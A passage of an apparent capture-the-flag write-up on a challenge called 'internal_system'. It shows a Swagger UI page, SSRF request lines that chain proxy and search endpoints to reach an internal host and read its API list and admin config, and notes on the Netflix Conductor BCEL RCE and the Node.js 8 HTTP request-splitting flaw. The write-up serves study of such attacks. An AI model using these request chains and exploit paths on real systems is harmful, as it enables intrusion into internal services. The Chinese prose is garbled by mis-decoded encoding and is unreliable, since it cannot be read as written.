<span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/jquery.slideto.min.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/jquery.wiggle.min.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/jquery.ba-bbq.min.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/handlebars-4.0.5.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/lodash.min.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/backbone-min.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>swagger-ui.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/highlight.9.1.0.pack.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/highlight.9.1.0.pack_extended.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/jsoneditor.min.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/marked.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lib/swagger-oauth.js<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- Some basic translations --&gt;</span> <span class="token comment">&lt;!-- &lt;script src='lang/translator.js' type='text/javascript'&gt;&lt;/script&gt; --&gt;</span> <span class="token comment">&lt;!-- &lt;script src='lang/ru.js' type='text/javascript'&gt;&lt;/script&gt; --&gt;</span> <span class="token comment">&lt;!-- &lt;script src='lang/en.js' type='text/javascript'&gt;&lt;/script&gt; --&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">var</span> url <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">url=([^&amp;]+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//http://127.0.0.1:8080/?url=127.0.0.1:8080</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">&amp;&amp;</span> url<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> url <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>url<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'://'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> url <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>origin<span class="token punctuation">;</span> <span class="token punctuation">}</span> hljs<span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span><span class="token punctuation">{</span> highlightSizeThreshold<span class="token operator">:</span> <span class="token number">5000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Pre load translate...</span> <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>SwaggerTranslator<span class="token punctuation">)</span> <span class="token punctuation">{</span> window<span class="token punctuation">.</span>SwaggerTranslator<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> window<span class="token punctuation">.</span>swaggerUi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SwaggerUi</span><span class="token punctuation">(</span><span class="token punctuation">{</span> url<span class="token operator">:</span> url <span class="token operator">+</span> <span class="token string">"/api/swagger.json"</span><span class="token punctuation">,</span> dom_id<span class="token operator">:</span> <span class="token string">"swagger-ui-container"</span><span class="token punctuation">,</span> supportedSubmitMethods<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'patch'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function-variable function">onComplete</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">swaggerApi<span class="token punctuation">,</span> swaggerUi</span><span class="token punctuation">)</span><span class="token punctuation">{</span> window<span class="token punctuation">.</span>swaggerUi<span class="token punctuation">.</span>api<span class="token punctuation">.</span><span class="token function">setBasePath</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> initOAuth <span class="token operator">==</span> <span class="token string">"function"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">initOAuth</span><span class="token punctuation">(</span><span class="token punctuation">{</span> clientId<span class="token operator">:</span> <span class="token string">"your-client-id"</span><span class="token punctuation">,</span> clientSecret<span class="token operator">:</span> <span class="token string">"your-client-secret-if-required"</span><span class="token punctuation">,</span> realm<span class="token operator">:</span> <span class="token string">"your-realms"</span><span class="token punctuation">,</span> appName<span class="token operator">:</span> <span class="token string">"your-app-name"</span><span class="token punctuation">,</span> scopeSeparator<span class="token operator">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> additionalQueryStringParams<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>SwaggerTranslator<span class="token punctuation">)</span> <span class="token punctuation">{</span> window<span class="token punctuation">.</span>SwaggerTranslator<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token function-variable function">onFailure</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Unable to Load SwaggerUI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> docExpansion<span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span> jsonEditor<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> defaultModelRendering<span class="token operator">:</span> <span class="token string">'schema'</span><span class="token punctuation">,</span> showRequestHeaders<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>swaggerUi<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'console'</span> <span class="token keyword">in</span> window<span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>console<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swagger-section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>header<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swagger-ui-wrap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://swagger.io<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo__img<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swagger<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/logo_small.png<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo__title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>swagger<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>api_selector<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>input<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://example.com/api<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_baseUrl<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>baseUrl<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>auth_container<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>input<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>explore<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header__btn<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">data-sw-translate</span><span class="token punctuation">&gt;</span></span>Explore<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-bar<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swagger-ui-wrap<span class="token punctuation">"</span></span> <span class="token attr-name">data-sw-translate</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swagger-ui-container<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swagger-ui-wrap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ ¹æ® <code>swagger.json</code> æ‹¿åˆ°æ¥å£åˆ—è¡¨ã€‚</p><pre class="language-none"><code class="language-none">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/swagger.json</code></pre><p>ç›´æ¥æ‰¾äº†ä¸ª <a href="https://petstore.swagger.io/">Swagger UI demo</a>ï¼Œç„¶åæœ¬åœ°èµ·ä¸ªæœåŠ¡ï¼ŒæŠŠä¸Šé¢å¾—åˆ°çš„æ•°æ®å¯¼è¿›å»ã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405155645901.png"></p><p>å…ˆçœ‹çœ‹é…ç½®å‚æ•°ã€‚</p><pre class="language-none"><code class="language-none">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/admin/config</code></pre><p>å¾—åˆ°</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"jetty.git.hash"</span><span class="token operator">:</span> <span class="token string">"b1e6b55512e008f7fbdf1cbea4ff8a6446d1073b"</span><span class="token punctuation">,</span>    <span class="token property">"loadSample"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>    <span class="token property">"io.netty.noUnsafe"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>    <span class="token property">"conductor.jetty.server.enabled"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>    <span class="token property">"io.netty.noKeySetOptimization"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>    <span class="token property">"buildDate"</span><span class="token operator">:</span> <span class="token string">"2021-04-03_17:38:09"</span><span class="token punctuation">,</span>    <span class="token property">"io.netty.recycler.maxCapacityPerThread"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>    <span class="token property">"conductor.grpc.server.enabled"</span><span class="token operator">:</span> <span class="token string">"false"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.26.0-SNAPSHOT"</span><span class="token punctuation">,</span>    <span class="token property">"queues.dynomite.nonQuorum.port"</span><span class="token operator">:</span> <span class="token string">"22122"</span><span class="token punctuation">,</span>    <span class="token property">"workflow.elasticsearch.url"</span><span class="token operator">:</span> <span class="token string">"es:9300"</span><span class="token punctuation">,</span>    <span class="token property">"workflow.namespace.queue.prefix"</span><span class="token operator">:</span> <span class="token string">"conductor_queues"</span><span class="token punctuation">,</span>    <span class="token property">"user.timezone"</span><span class="token operator">:</span> <span class="token string">"GMT"</span><span class="token punctuation">,</span>    <span class="token property">"workflow.dynomite.cluster.name"</span><span class="token operator">:</span> <span class="token string">"dyno1"</span><span class="token punctuation">,</span>    <span class="token property">"sun.nio.ch.bugLevel"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token property">"workflow.dynomite.cluster.hosts"</span><span class="token operator">:</span> <span class="token string">"dyno1:8102:us-east-1c"</span><span class="token punctuation">,</span>    <span class="token property">"workflow.elasticsearch.instanceType"</span><span class="token operator">:</span> <span class="token string">"external"</span><span class="token punctuation">,</span>    <span class="token property">"db"</span><span class="token operator">:</span> <span class="token string">"dynomite"</span><span class="token punctuation">,</span>    <span class="token property">"queues.dynomite.threads"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">,</span>    <span class="token property">"workflow.namespace.prefix"</span><span class="token operator">:</span> <span class="token string">"conductor"</span><span class="token punctuation">,</span>    <span class="token property">"workflow.elasticsearch.index.name"</span><span class="token operator">:</span> <span class="token string">"conductor"</span><span class="token punctuation">}</span></code></pre><p>ç‰ˆæœ¬ä¸º <code>2.26.0-SNAPSHOT</code>ã€‚</p><h3 id="Step-04-Netflix-Conductor-RCE"><a href="#Step-04-Netflix-Conductor-RCE" class="headerlink" title="Step 04 Netflix Conductor RCE"></a>Step 04 Netflix Conductor RCE</h3><p>å‚è€ƒ <a href="https://xz.aliyun.com/t/7889#toc-4">CVE-2020-9296-Netflix-Conductor-RCE-æ¼æ´åˆ†æ</a></p><p>å¤ªé¡¶äº†ï¼<em>ï¼ˆå’±ä¸ä¼š Javaï¼Œå“­å“­</em></p><blockquote><p>è¿™ä¸ªæ¼æ´å‡ºåœ¨ <code>/api/metadata/taskdefs</code> ä¸Šï¼Œéœ€è¦ POST ä¸€ä¸ª JSON è¿‡å»ï¼Œé‡Œé¢å«æœ‰æ¶æ„çš„ BCEL ç¼–ç ï¼Œå¯ä»¥é€ æˆ RCEã€‚</p></blockquote><p>ä»€ä¹ˆæ˜¯ <strong>BCELç¼–ç </strong> å‘¢ï¼Ÿ</p><blockquote><p><a href="http://commons.apache.org/proper/commons-bcel/">http://commons.apache.org/proper/commons-bcel/</a></p><p>The Byte Code Engineering Library (Apache Commons BCELâ„¢) is intended to give users a convenient way to analyze, create, and manipulate (binary) Java class files (those ending with .class). Classes are represented by objects which contain all the symbolic information of the given class: methods, fields and byte code instructions, in particular.</p><p>Byte Code Engineering Library (BCEL)ï¼Œè¿™æ˜¯Apache Software Foundation  çš„Jakarta é¡¹ç›®çš„ä¸€éƒ¨åˆ†ã€‚BCELæ˜¯ Java classworking æœ€å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æ¡†æ¶,å®ƒå¯ä»¥è®©æ‚¨æ·±å…¥ JVM  æ±‡ç¼–è¯­è¨€è¿›è¡Œç±»æ“ä½œçš„ç»†èŠ‚ã€‚</p></blockquote><p>å¯ä»¥ç”¨ <a href="https://github.com/f1tz/BCELCodeman">BCELCodeman</a> è¿™ä¸ªå·¥å…·æ¥ç¼–ç ã€è§£ç ã€‚</p><h3 id="Step-05-NodeJS-8-HTTP-è¯·æ±‚èµ°ç§"><a href="#Step-05-NodeJS-8-HTTP-è¯·æ±‚èµ°ç§" class="headerlink" title="Step 05 NodeJS 8 HTTP è¯·æ±‚èµ°ç§"></a>Step 05 NodeJS 8 HTTP è¯·æ±‚èµ°ç§</h3><p>æš‚ä¸”å…ˆä¸çœ‹è¿™ä¸ªï¼Œå’±å…ˆçœ‹çœ‹ <strong>æ€ä¹ˆä» GET æ¥å£æ‰“ POST è¯·æ±‚</strong>ã€‚</p><p>NodeJS æœ‰ä¸ª <a href="https://www.cvedetails.com/cve/CVE-2018-12116/">CVE-2018-12116</a>ï¼Œå¯ä»¥åœ¨ <code>path</code> é‡Œæ„é€ å¸¦æœ‰ Unicode çš„æ•°æ®ï¼Œå‘é€éé¢„æœŸçš„è·¯å¾„ç»™æœåŠ¡ç«¯æ¥ç”Ÿæˆå¦ä¸€ä¸ª HTTP è¯·æ±‚ã€‚</p><p>æˆ–è€…å¯ä»¥è¯´æ˜¯ <strong>HTTP è¯·æ±‚èµ°ç§</strong>ï¼ˆHTTP request smugglingï¼‰ã€‚</p><blockquote><p>Node.js: All versions prior to Node.js 6.15.0 and 8.14.0: HTTP request  splitting: If Node.js can be convinced to use unsanitized user-provided  Unicode data for the <code>path</code> option of an HTTP request, then data can be  provided which will trigger a second, unexpected, and user-defined HTTP  request to made to the same server.</p></blockquote><p><em>ï¼ˆè‰ï¼Œè¿™ä¹Ÿè¡Œ</em></p><p>æ ¹æ®æºç ä¸­çš„</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> salt <span class="token operator">=</span> <span class="token string">'nooooooooodejssssssssss8_issssss_beeeeest'</span></code></pre><p>å¯ä»¥çŸ¥é“ç”¨åˆ°çš„æ˜¯ NodeJS 8. <em>ï¼ˆè¿™è°æƒ³åˆ°å‘¢</em></p><p><del>å”‰ï¼Œå·¨å¤è€çš„ç‰ˆæœ¬ï¼Œå¥½çƒ¦æ‰‹ä¸Šæ²¡ç¯å¢ƒ</del> <strong>docker å¤§æ³•å¥½å•Šï¼</strong></p><p>æœä¸€ä¸‹ tag</p><p><a href="https://hub.docker.com/_/node?tab=description&amp;page=1&amp;ordering=last_updated&amp;name=8.13">https://hub.docker.com/_/node?tab=description&amp;page=1&amp;ordering=last_updated&amp;name=8.13</a></p><p><em>ï¼ˆæœ¬æ¥çœ‹å½±å“èŒƒå›´åˆ° 8.14.0 çš„ï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹ 